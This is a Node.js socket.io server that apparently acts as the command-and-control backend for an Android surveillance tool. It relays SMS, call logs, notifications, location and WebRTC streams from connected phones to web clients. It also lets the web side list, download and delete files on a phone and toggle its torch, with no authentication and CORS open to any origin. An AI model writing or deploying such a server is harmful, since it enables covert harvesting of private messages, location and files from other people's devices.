const express = require('express');
const http    = require('http');
const { Server } = require('socket.io');
const path    = require('path');
const fs      = require('fs');

const app    = express();
const server = http.createServer(app);
const io     = new Server(server, {
  cors: { origin: '*', methods: ['GET', 'POST'], credentials: true },
  pingTimeout: 20000,
  pingInterval: 10000
});

const publicPath = path.join(__dirname, 'public');
if (!fs.existsSync(publicPath)) { console.error('FATAL: public/ not found'); process.exit(1); }
app.use(express.static(publicPath));
app.use((req, res, next) => { console.log(`HTTP ${req.method} ${req.url}`); next(); });
app.get('*', (req, res) => {
  const idx = path.join(publicPath, 'index.html');
  if (fs.existsSync(idx)) res.sendFile(idx);
  else res.status(404).send('index.html not found');
});

const webClients     = new Set();
const androidClients = new Set();

// Helper: relay to explicit 'to', else fallback broadcast
function relay(socket, event, data) {
  const targetId = (typeof data === 'object' && data.to) ? data.to : null;
  if (targetId && io.sockets.sockets.get(targetId)) {
    io.to(targetId).emit(event, data);
    return true;
  }
  // Fallback broadcast
  if (webClients.has(socket.id)) {
    androidClients.forEach(id => io.to(id).emit(event, data));
  } else if (androidClients.has(socket.id)) {
    webClients.forEach(id => io.to(id).emit(event, data));
  }
  return false;
}

io.on('connection', socket => {
  console.log(`Connected: ${socket.id} from ${socket.handshake.address}`);
  socket.emit('id', socket.id);

  socket.on('identify', type => {
    console.log(`${socket.id} identified as: ${type}`);
    if (type === 'web') {
      webClients.add(socket.id);
      // Notify all androids
      androidClients.forEach(aid => {
        io.to(aid).emit('web-client-ready', socket.id);
        io.to(socket.id).emit('android-client-ready', aid);
      });
    } else if (type === 'android') {
      androidClients.add(socket.id);
      // Notify all webs
      webClients.forEach(wid => {
        socket.emit('web-client-ready', wid);
        io.to(wid).emit('android-client-ready', socket.id);
      });
    }
    console.log(`Web: ${webClients.size}, Android: ${androidClients.size}`);
  });

  socket.on('web-client-ready', id => {
    if (id !== socket.id) return;
    webClients.add(id);
    androidClients.forEach(aid => io.to(aid).emit('web-client-ready', id));
  });

  // WebRTC signal relay
  socket.on('signal', data => {
    const delivered = relay(socket, 'signal', data);
    if (!delivered) socket.emit('error', { message: `Recipient ${data.to} not found`, code: 'RECIPIENT_NOT_FOUND' });
    else console.log(`Signal ${data.signal ? data.signal.type || 'candidate' : '?'} from ${data.from} -> ${data.to}`);
  });

  // Data events
  ['notification', 'call_log', 'sms', 'location'].forEach(event => {
    socket.on(event, data => {
      const delivered = relay(socket, event, data);
      if (!delivered) console.warn(`${event}: recipient ${data.to} not found`);
    });
  });

  // Torch control (web -> android)
  socket.on('torch', data => {
    console.log(`Torch command from ${socket.id}: ${JSON.stringify(data)}`);
    androidClients.forEach(aid => io.to(aid).emit('torch', data));
  });

  // File system events
  const fsEvents = [
    'fs:list', 'fs:files', 'fs:download', 'fs:download_ready',
    'fs:delete', 'fs:download_start', 'fs:download_chunk',
    'fs:download_complete', 'fs:download_error'
  ];
  fsEvents.forEach(event => {
    socket.on(event, data => {
      console.log(`${event} from ${socket.id}`);
      relay(socket, event, data);
    });
  });

  socket.on('disconnect', () => {
    console.log(`Disconnected: ${socket.id}`);
    const wasWeb     = webClients.delete(socket.id);
    const wasAndroid = androidClients.delete(socket.id);
    if (wasWeb) {
      androidClients.forEach(aid => io.to(aid).emit('web-client-disconnected', socket.id));
    }
    if (wasAndroid) {
      webClients.forEach(wid => io.to(wid).emit('android-client-disconnected', socket.id));
    }
    console.log(`Web: ${webClients.size}, Android: ${androidClients.size}`);
  });

  socket.on('error', err => console.error(`Socket error from ${socket.id}:`, err));
});

server.on('error', err => console.error('Server error:', err));
const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => console.log(`Server running on port ${PORT}`));
process.on('SIGINT', () => { server.close(() => { console.log('Shut down'); process.exit(0); }); });
